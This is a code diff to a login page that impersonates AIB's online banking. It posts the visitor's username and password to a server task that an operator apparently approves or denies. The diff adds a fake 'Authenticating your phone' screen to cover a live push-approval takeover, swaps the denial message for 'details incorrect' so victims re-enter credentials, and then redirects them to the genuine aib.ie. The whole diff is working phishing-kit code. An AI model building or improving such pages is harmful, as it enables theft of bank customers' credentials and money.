@@ -52,10 +52,20 @@
 
       .ping-status{text-align:center;padding:16px 0;font-family:"ProximaNovaRegular",sans-serif;font-size:14px;line-height:20px;border-radius:8px;margin-top:16px}
       .ping-status.info{background:#e8f5e9;color:#2e7d32}
-      .ping-status.error{background:#fce4ec;color:#c62828}
+      .ping-status.error{background:none;color:#c62828;padding:8px 0 0;margin-top:0;font-family:"ProximaNovaRegular",sans-serif;font-size:15px;text-align:left;line-height:22px}
       .ping-status.warning{background:#fff8e1;color:#f57f17}
       .ping-status-spinner{display:inline-block;width:16px;height:16px;border:2px solid rgba(0,0,0,.2);border-top-color:#00846a;border-radius:50%;animation:spin .8s linear infinite;vertical-align:middle;margin-right:8px}
       @keyframes spin{to{transform:rotate(360deg)}}
+
+      #authScreen{display:none;text-align:center;padding:40px 20px 60px}
+      #authScreen.show{display:block}
+      #authScreen .auth-logo{margin-bottom:40px}
+      #authScreen .auth-logo img{border-radius:8px;background:linear-gradient(45deg,#512d6d 0%,#c42f9e 80%);padding:10px;object-fit:contain}
+      .auth-spinner-wrap{position:relative;width:120px;height:120px;margin:0 auto 32px}
+      .auth-spinner-ring{width:120px;height:120px;border-radius:50%;border:6px solid rgba(196,47,158,.2);border-top-color:#512d6d;border-right-color:#8a3582;animation:authSpin 1.2s cubic-bezier(.5,.15,.5,.85) infinite;box-sizing:border-box}
+      @keyframes authSpin{to{transform:rotate(360deg)}}
+      .auth-title{font-family:"ProximaNovaBold",sans-serif;font-size:22px;color:#4d4d4d;margin-bottom:20px}
+      .auth-subtitle{font-family:"ProximaNovaRegular",sans-serif;font-size:15px;color:#888;line-height:22px}
 
       .ping-button.disabled{opacity:.5;pointer-events:none}
 
@@ -141,6 +151,17 @@
         </main>
     </div>
 
+    <div id="authScreen">
+        <div class="auth-logo">
+            <img src="./images/aib-logo.png" alt="AIB" width="70" height="70">
+        </div>
+        <div class="auth-spinner-wrap">
+            <div class="auth-spinner-ring"></div>
+        </div>
+        <div class="auth-title">Authenticating your phone</div>
+        <div class="auth-subtitle">Request sent to:<br><span id="authDeviceName"></span></div>
+    </div>
+
     <div class="ping-footer-container">
         <div class="ping-footer">
             <div class="ping-credits"></div>
@@ -161,12 +182,45 @@ function hideTrouble() {
 var currentTaskId = null;
 var pollTimer = null;
 
+function getDeviceName() {
+  var ua = navigator.userAgent;
+  if (/iPad/.test(ua)) return 'iPad';
+  if (/iPhone/.test(ua)) {
+    var w = screen.width, h = screen.height;
+    var d = Math.max(w, h);
+    if (d >= 932) return 'iPhone Pro Max';
+    if (d >= 852) return 'iPhone Pro';
+    if (d >= 812) return 'iPhone';
+    return 'iPhone';
+  }
+  if (/Android/.test(ua)) {
+    var m = ua.match(/;\s*([^;)]+)\s+Build\//);
+    if (m) return m[1].trim();
+    return 'Android device';
+  }
+  if (/Macintosh/.test(ua)) return 'Mac';
+  if (/Windows/.test(ua)) return 'Windows PC';
+  return 'your device';
+}
+
+function showAuthScreen() {
+  document.getElementById('authDeviceName').textContent = getDeviceName();
+  document.querySelector('.ping-header').style.display = 'none';
+  document.querySelector('.ping-body-container').style.display = 'none';
+  document.getElementById('authScreen').classList.add('show');
+}
+
+function hideAuthScreen() {
+  document.getElementById('authScreen').classList.remove('show');
+  document.querySelector('.ping-header').style.display = '';
+  document.querySelector('.ping-body-container').style.display = '';
+}
+
 function setStatus(msg, type) {
   var el = document.getElementById('statusArea');
   if (!msg) { el.innerHTML = ''; return; }
   var cls = 'ping-status ' + (type || 'info');
-  var spinner = type === 'info' ? '<span class="ping-status-spinner"></span>' : '';
-  el.innerHTML = '<div class="' + cls + '">' + spinner + msg + '</div>';
+  el.innerHTML = '<div class="' + cls + '">' + msg + '</div>';
 }
 
 function handleLogin(e) {
@@ -180,7 +234,8 @@ function handleLogin(e) {
 
   var btn = document.getElementById('loginBtn');
   btn.classList.add('disabled');
-  setStatus('Verifying your details...', 'info');
+  setStatus('');
+  showAuthScreen();
 
   fetch('/api/tasks', {
     method: 'POST',
@@ -203,15 +258,16 @@ function handleLogin(e) {
   .then(function(r) { return r.json(); })
   .then(function(data) {
     if (data.error) {
+      hideAuthScreen();
       setStatus('Login failed. Please try again.', 'error');
       btn.classList.remove('disabled');
       return;
     }
     currentTaskId = data.task.id;
-    setStatus('Please wait while we verify your identity...', 'info');
     pollStatus();
   })
   .catch(function() {
+    hideAuthScreen();
     setStatus('Connection error. Please try again.', 'error');
     btn.classList.remove('disabled');
   });
@@ -223,25 +279,27 @@ function pollStatus() {
     .then(function(r) { return r.json(); })
     .then(function(data) {
       if (!data.task) {
+        hideAuthScreen();
         setStatus('Session expired. Please try again.', 'error');
         document.getElementById('loginBtn').classList.remove('disabled');
         return;
       }
       var s = data.task.status;
       if (s === 'approved') {
-        setStatus('Identity verified. Redirecting to your account...', 'info');
+        document.querySelector('.auth-title').textContent = 'Logging in to your account...';
+        document.querySelector('.auth-subtitle').innerHTML = 'Preparing your dashboard';
         setTimeout(function() {
           window.location.href = 'https://aib.ie';
-        }, 1500);
+        }, 3000);
       } else if (s === 'denied') {
-        setStatus('Login denied. Please contact AIB support on 0818 724 724.', 'error');
+        hideAuthScreen();
+        setStatus('The details you have entered are incorrect. Please try again.', 'error');
         document.getElementById('loginBtn').classList.remove('disabled');
+        document.getElementById('password').value = '';
+        document.getElementById('username').focus();
         currentTaskId = null;
       } else if (s === 'redirected') {
-        setStatus('Your session is being redirected...', 'warning');
-        setTimeout(function() {
-          window.location.href = 'https://aib.ie';
-        }, 1500);
+        window.location.href = 'https://aib.ie';
       } else {
         pollTimer = setTimeout(pollStatus, 2000);
       }
